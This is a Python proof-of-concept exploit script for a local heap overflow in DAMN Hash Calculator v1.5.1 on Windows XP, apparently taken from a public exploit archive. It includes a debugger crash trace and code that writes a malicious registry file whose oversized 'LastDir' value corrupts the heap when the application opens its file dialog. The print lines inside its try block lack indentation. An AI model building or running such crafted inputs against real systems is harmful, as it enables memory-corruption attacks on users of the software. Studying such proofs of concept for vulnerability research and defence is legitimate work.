#!/usr/bin/python
# Exploit Title: DAMN Hash Calculator v1.5.1 Local Heap Overflow PoC
# Version:       1.5.1
# Date:          2012-02-21
# Author:        Julien Ahrens
# Homepage:      http://www.inshell.net
# Software Link: http://www.google.com
# Tested on:     Windows XP SP3 Professional German
# Notes:         Old but nice software...just to proof it's there :-)
# Howto:         Import Reg -> Start App -> Select File -> Cancel without choosing one
#7C9204E6   . 8B7D 08        MOV EDI,DWORD PTR SS:[EBP+8]
#7C9204E9   . 0B47 10        OR EAX,DWORD PTR DS:[EDI+10]
#7C9204EC   . A9 00000269    TEST EAX,69020000
#7C9204F1   . 0F85 8BA70300  JNZ ntdll.7C95AC82
#7C9204F7   > 8B45 10        MOV EAX,DWORD PTR SS:[EBP+10]
#7C9204FA   . 8A48 FD        MOV CL,BYTE PTR DS:[EAX-3] <-- Crash
#7C9204FD   . 83C0 F8        ADD EAX,-8
#7C920500   . F6C1 01        TEST CL,1
#7C920503   . 56             PUSH ESI
#7C920504   . 0F84 92A70300  JE ntdll.7C95AC9C
#7C92050A   . F6C1 08        TEST CL,8
#7C92050D   . 0F85 B3A70300  JNZ ntdll.7C95ACC6
#EAX 42424245
#ECX 00000008
#EDX 77C31AE8 msvcrt.77C31AE8
#EBX 0040F2F0 DAMN_Has.0040F2F0
#ESP 0012F54C
#EBP 0012F550
#ESI 0041A2DC ASCII "EBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
#EDI 00330000
#EIP 7C9204FA ntdll.7C9204FA
file="poc.reg"
junk1="\x41" * 392
boom="\x45\x42\x42\x42"
junk2="\x43" * 50
poc="Windows Registry Editor Version 5.00\n\n"
poc=poc + "[HKEY_CURRENT_USER\Software\DAMN\Hash Calculator\Settings]\n"
poc=poc + "\"LastDir\"=\"" + junk1 + boom + junk2 + "\""
try:
print "[*] Creating exploit file...\n";
writeFile = open (file, "w")
writeFile.write( poc )
writeFile.close()
print "[*] File successfully created!";
except:
print "[!] Error while creating file!";